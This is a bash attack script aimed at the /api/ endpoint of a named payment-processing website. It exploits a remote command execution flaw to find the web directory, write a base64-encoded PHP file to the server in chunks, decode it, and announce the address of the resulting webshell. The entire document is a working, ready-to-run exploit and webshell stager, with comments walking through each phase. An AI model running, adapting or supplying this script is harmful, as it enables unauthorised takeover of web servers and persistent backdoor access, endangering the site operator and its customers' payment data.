#!/bin/bash 
vuln_webapp="http://acmepaymentprocessing.com"
vuln_uri="/api/"
TGT="${vuln_webapp}${vuln_uri}"
#get the PWD (webdir) we're running in
echo "---> Phase 1 - Information gathering <---"
webdir=`curl -XPOST -s ${TGT} -d "action=pwd" | sed -e 's/<[^>]*>//g'`

echo "I detected the webdir as $webdir"

#we're going to "split" the payload into parts and "upload" these to the webserver
echo "---> Phase 2 - create payload <---"
i=0
#zero out the file (so you can re-run this as many times as you like)
cmd="echo '' > $webdir/images.b64"
#At each step we need to URI encode the string
cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
#now using curl we execute the command against the known vulnerable script (RCE - Remote Code Execution)
curl -XPOST -s "${TGT}" -d "action=${cmd}" > /dev/null
#Now we're going to use the base64 binary to split the payload into smaller parts
base64 -w 100 images.php | while read chunk
do
    (( i++ ))
    chunk_inject="echo -n '$chunk' >> $webdir/images.b64"
    echo "Executing payload line $i: $chunk_inject";
    cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$chunk_inject")"
    curl -XPOST -s "${TGT}" -d "action=${cmd}" > /dev/null
done
echo "SUCCESS Encoded payload staging completed"
#Ok great we have staged the payload, however it is still base64 encoded, we need to unpack it
echo "Phase3 ---> unpacking payload <---"
cmd="base64 -d $webdir/images.b64 > $webdir/images.php"
cmd="$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' "$cmd")"
curl -XPOST -s "${TGT}" -d "action=${cmd}" > /dev/null
#And we're done, display the link at which the payload script will run and exit
echo "Payload staged webshell should be available here ${TGT}/images.php"
